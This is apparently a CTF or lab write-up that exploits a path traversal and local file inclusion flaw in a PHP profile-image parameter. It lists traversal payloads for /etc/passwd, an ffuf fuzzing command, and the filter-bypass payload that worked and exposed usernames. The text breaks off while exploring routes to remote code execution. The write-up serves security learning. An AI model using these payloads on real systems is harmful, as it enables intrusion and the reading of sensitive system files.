# LFI + path traversal

From inspection of the network requests, I found a request that loads the profile image using a query parameter to specify the path to the file:

```http
GET /profile.php?img=profile.png HTTP/1.1
Host: xxx.xxx.xxx.xxx:50000
User-Agent: xxx
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: connect.sid=xxxx
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

As found previously, the `profile.png` is present in the `/uploads` directory. Thus, it appears that the `img` query input will be used to search for a file in that directory.&#x20;

Possible path: `/var/www/html/uploads/profile.png`.

### Simple payloads

With knowledge of the current directory, I started off with simple payloads:

1. Path traversal
   * `../../../../etc/passwd`
   * `%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd`  (URL encoded)
   * `..//..//..//..//etc/passwd`
   * `%2E%2E%2F%2F%2E%2E%2F%2F%2E%2E%2F%2F%2E%2E%2F%2Fetc%2Fpasswd` (URL encoded)
2. Remote public resource
   * [https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAx6camOf\_G96Zcs2Zj34Yjmy0ysPd-p0oJQ\&s](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAx6camOf_G96Zcs2Zj34Yjmy0ysPd-p0oJQ\&s)



### Brute force discovery

I performed a brute force attack using `ffuf`, with the [wordlist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/JHADDIX_LFI.txt):

* Cookie: `-H "Cookie: PHPSESSID=xxxx"`&#x20;
* Filter out empty responses: `--fs 0`

```sh
$ ffuf -w /<wordlist> -u http://<target>:50000/profile.php?img=FUZZ -H "Cookie: PHPSESSID=xxxx" --fs 0
```

The payload: `....//....//....//....//....//....//....//....//....//etc/passwd` was found to work:

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

This provides us the following information:

1. Usernames:
   * `joshua`, `charles`
2. More importantly, the server is vulnerable to a Local File Inclusion (LFI) vulnerability!

### Exploring methods of exploitation

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md" %}

Following the guide in the link above, I explored a few methods to gain RCE on the system.

#### 1. SMTP (port 25)

#### 2. SSH (port 22)

#### Interesting discovery

With the `img` payload value of `#` (`/profile.php?img=#`), we are presented with a status **400** response:

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
